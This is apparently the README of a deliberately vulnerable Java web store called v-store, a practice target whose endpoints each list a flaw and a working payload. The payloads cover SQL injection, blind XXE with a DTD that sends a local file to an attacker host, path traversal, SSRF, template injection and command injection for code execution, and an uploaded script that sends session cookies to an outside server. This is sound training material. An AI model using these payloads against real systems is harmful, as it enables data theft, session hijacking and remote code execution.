# v-store
/Vstore

## Bug API
### 1. GET "/product/findUnsafe"
- Bug: SQLi
- Params: {name}
- Payload:
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: http://localhost:8080/product/findUnsafe?name=' OR 6776=6776#
    
    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: http://localhost:8080/product/findUnsafe?name=a'union+select+user_name,null,null,null+from+user;%23

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: http://localhost:8080/product/findUnsafe?name=' AND GTID_SUBSET(CONCAT(0x716b6b6a71,(SELECT (ELT(8054=8054,1))),0x716b717871),8054)-- jkbJ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://localhost:8080/product/findUnsafe?name=' AND (SELECT 5823 FROM (SELECT(SLEEP(5)))RyfP)-- FGig
    
### 2. POST "/product/showBillVuln"
- Bug: Blind Out-of-Band XXE
- Params: object User in body request
- Payload: 
+ SSRF 
```
  <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://kayrz7fdlsb6w9gif751ob26rxxtli.burpcollaborator.net"> ]>
    <user>
      <id_user>&xxe;</id_user>
    </user>
  ```
+ OOB

--- DTD file ---
```
<!ENTITY % file SYSTEM "file:///d:/cache.txt">
        <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker-host/%file;'>">
        %eval;
        %exfiltrate;
```
-- payload --
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://DTD-url"> %xxe;]>
<user>
<id_user>1</id_user></user>
```

### 3. POST "/product/buy"
- Bug: Logic
- Params: {num, id}
- Payload: num=-1&id=5

### 4. GET "/infoUserVuln"
- Bug: IDOR
- params: id
- payload: id=4

### 5. POST "/upAVTVuln"
- Bug: upload file avt tùy ý dẫn tới RCE, CSS
- params: image
- Payload: 
```
   POST /upAVT HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCsWyqYFoOyp4thoH
Cookie: JSESSIONID=69B4BBFF8707651A8E0F0D2D8E83DF3D
Connection: close

----WebKitFormBoundaryCsWyqYFoOyp4thoH
Content-Disposition: form-data; name="image"; filename="../../templates/home.html"
Content-Type: image/svg+xml

<!DOCTYPE HTML>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>VStore</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
<h1>Test PoC </h1>
</body>
</html>

------WebKitFormBoundaryCsWyqYFoOyp4thoH--
```
- Payload RCE: 
+ Upfile:
```
   POST /upAVT HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCsWyqYFoOyp4thoH
Cookie: JSESSIONID=69B4BBFF8707651A8E0F0D2D8E83DF3D
Connection: close

----WebKitFormBoundaryCsWyqYFoOyp4thoH
Content-Disposition: form-data; name="image"; filename="../../templates/home.html"
Content-Type: image/svg+xml

<!DOCTYPE HTML>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>VStore</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
<h1>Test PoC RCE</h1>
<p th:text="${T(java.lang.Runtime).getRuntime().exec('calc')}"/>
</body>
</html>

------WebKitFormBoundaryCsWyqYFoOyp4thoH--
```
- Payload CSS:
```
POST /upAVTVuln HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCsWyqYFoOyp4thoH
Cookie: JSESSIONID=69B4BBFF8707651A8E0F0D2D8E83DF3D
Connection: close

------WebKitFormBoundaryCsWyqYFoOyp4thoH
Content-Disposition: form-data; name="image"; filename="css.html"
Content-Type: image/svg+xml

<!DOCTYPE HTML>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>VStore</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
<h1>Test PoC CSS</h1>
<script>
            var cookie = document.cookie;
            let xhr = new XMLHttpRequest();
            let url = "http://sonnguy3n.info:8888/?a=";					
            xhr.open("GET", url+cookie, true);						            
            xhr.send();
</script>
</body>
</html>

------WebKitFormBoundaryCsWyqYFoOyp4thoH--
```
+ Link CSS: GET "/getImage?name=css.html"


### 6. POST "/upAVTUrlVuln"
- Bug: SSRF
- Params: url
- Payload: 

"http://host.com/pic.png"

"file:c:/C:/Windows/system.ini"

### 7. GET "/getImage"
- Bug: get file tùy ý
- Params: name
- payload: "../../templates/home.html"
   
### 8. GET "/home" or GET "/"
- Bug: Template Injection
- Params: msg
- Payload:
```
T(org.apache.commons.io.IOUtils).toString(
    T(java.lang.Runtime).getRuntime().exec('powershell ls').getInputStream(),
    T(java.nio.charset.StandardCharsets).UTF_8.name()
    )
```

### 9 POST "/admin/checkAVTVuln"
- Bug: Command injection
- Params: name
- Payload: name= ss')){echo 1;}else{ls;};if(('1
